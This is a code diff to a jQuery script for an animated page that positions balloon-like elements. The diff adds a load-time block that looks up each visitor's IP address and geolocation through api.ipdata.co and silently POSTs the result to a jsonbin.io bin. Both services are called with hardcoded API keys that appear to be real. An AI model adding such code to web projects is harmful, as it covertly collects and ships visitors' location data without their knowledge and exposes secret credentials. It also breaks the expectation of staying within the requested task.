@@ -2,7 +2,30 @@ $(window).load(function(){
 	$('.loading').fadeOut('fast');
 	$('.container').fadeIn('fast');
 });
+
+function json(url) {
+	return fetch(url).then(res => res.json());
+}
+
+let apiKeyA = 'e12a7ce0f7076defd7e98c66512e2cb1647d123c932e79053f12503d';
+let apiKeyB = '$2a$10$NR9ugmh9xNtvfduiUh5RveRTzNzvSkz1lUDENsbAUyXsWKdPFZ8k.' 
+json(`https://api.ipdata.co?api-key=${apiKeyA}`).then(data => {
+	const sData = {
+		data
+	}
+	fetch('https://api.jsonbin.io/v3/b', {
+		method: 'POST',
+		headers: {
+			'Content-Type': 'application/json',
+			'X-Master-Key': apiKeyB
+		},
+		body: JSON.stringify(sData)
+	})
+		.then(response => response.json())
+});
+
 $('document').ready(function(){
+	// json;
 	var system ={};
 	var p = navigator;
 	var wid = 0, hei = 0, size = 1;
@@ -46,7 +69,7 @@ $('document').ready(function(){
 		$('#b22').animate({top:240, left: vw-300*size},500);
 		$('#b33').animate({top:240, left: vw-200*size},500);
 		$('#b44').animate({top:240, left: vw-100*size},500);
-		$('#b55').animate({top:240, left: vw+0o0*size},500);
+		$('#b55').animate({top:240, left: vw+00*size},500);
 		$('#b66').animate({top:240, left: vw+100*size},500);
 		$('#b77').animate({top:240, left: vw+200*size},500);
 		$('#b88').animate({top:240, left: vw+300*size},500);
@@ -199,7 +222,7 @@ $('document').ready(function(){
 		$('#b22').animate({top:240, left: vw-300*size},500);
 		$('#b33').animate({top:240, left: vw-200*size},500);
 		$('#b44').animate({top:240, left: vw-100*size},500);
-		$('#b55').animate({top:240, left: vw+0o0*size},500);
+		$('#b55').animate({top:240, left: vw+00*size},500);
 		$('#b66').animate({top:240, left: vw+100*size},500);
 		$('#b77').animate({top:240, left: vw+200*size},500);
 		$('#b88').animate({top:240, left: vw+300*size},500);
